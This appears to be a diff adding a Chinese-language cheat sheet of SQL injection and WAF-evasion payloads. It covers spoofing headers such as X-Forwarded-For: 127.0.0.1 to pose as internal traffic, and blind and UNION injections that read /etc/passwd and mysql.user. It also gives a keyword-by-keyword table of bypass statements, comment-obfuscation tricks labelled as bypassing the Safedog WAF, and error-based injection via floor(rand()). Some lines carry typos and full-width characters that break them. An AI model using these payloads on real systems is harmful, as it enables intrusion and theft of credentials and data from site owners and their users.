@@ -1,0 +1,93 @@
+请求头欺骗
+让waf以为请求来自于内部网络，进而不对其进行过滤。
+添加如下请求头
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+
+
+SELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);
+
+%2527+and+
+(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+
+BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
+
+0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
+
+
+1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
+
+%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201
+
+
+a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
+
+union%23%0A%0Dselect%2D%2D%0A%0D1,2,3
+
+
+过滤关键词: and, or, union
+可能正则: preg_match('/(and|or|union)/i', $id)
+被拦截的语句: union select user, password from users
+bypass语句: 1 || (select user from users where user_id=1)='admin'
+
+过滤关键词: and, or, union, where
+被拦截的语句: 1 || (select user from users where user_id = 1) = 'admin'
+bypass语句: 1 || (select user from users limit 1)='admin'
+
+
+过滤关键词: and, or, union, where, limit
+被拦截的语句: 1 || (select user from users limit 1) = 'admin'
+bypass语句: 1 || (select user from users group by user_id having user_id = 1) = 'admin'
+
+过滤关键词: and, or, union, where, limit, group by
+被拦截的语句: 1 || (select user from users group by user_id having user_id = 1) = 'admin'
+bypass语句: 1 || (select substr(group_concat(user_id),1,1) user from users ) = 1
+
+过滤关键词: and, or, union, where, limit, group by, select
+被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1
+bypass语句: 1 || 1 = 1 into outfile 'result.txt'
+bypass语句: 1 || substr(user,1,1) = 'a'
+
+
+过滤关键词: and, or, union, where, limit, group by, select, '
+被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1
+bypass语句: 1 || user_id is not null
+bypass语句: 1 || substr(user,1,1) = 0x61
+bypass语句: 1 || substr(user,1,1) = unhex(61)
+
+
+过滤关键词: and, or, union, where, limit, group by, select, ', hex
+被拦截的语句: 1 || substr(user,1,1) = unhex(61)
+bypass语句: 1 || substr(user,1,1) = lower(conv(11,10,36))
+
+
+过滤关键词: and, or, union, where, limit, group by, select, ', hex, substr
+被拦截的语句: 1 || substr(user,1,1) = lower(conv(11,10,36))
+bypass语句: 1 || lpad(user,7,1)
+
+
+滤关键词: and, or, union, where, limit, group by, select, ', hex, substr, white space
+被拦截的语句: 1 || lpad(user,7,1)
+bypass语句: 1%0b||%0blpad(user,7,1)
+
+
+安全狗绕过
+/*!order /*/*%/**/by*/4-- -
+/*!union/*!/*/**/*/select/**/
+/*!database/*!/*/**/*/()/**/
+/*!order/*!/*/**/*/by/**/
+/*!union/*!/*/**/*/
+/*!updatexml/*!/*/**/*/
+/*!extractvalue/*!/*/**/*/
+
+
+###############################################################
+1' or (select 1 from (select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2)) a from information_schema.tables group by a--+
+
+1' and (select count（*） from information_schema.tables group by concat（（select user（）），0x7e，floor（rand（0）*2））)--+
+
+select count(*) from information_schema.tables group by  concat((select version())，floor(rand(0)*2))
+
+由于group by 不能对float类型分组造成出错
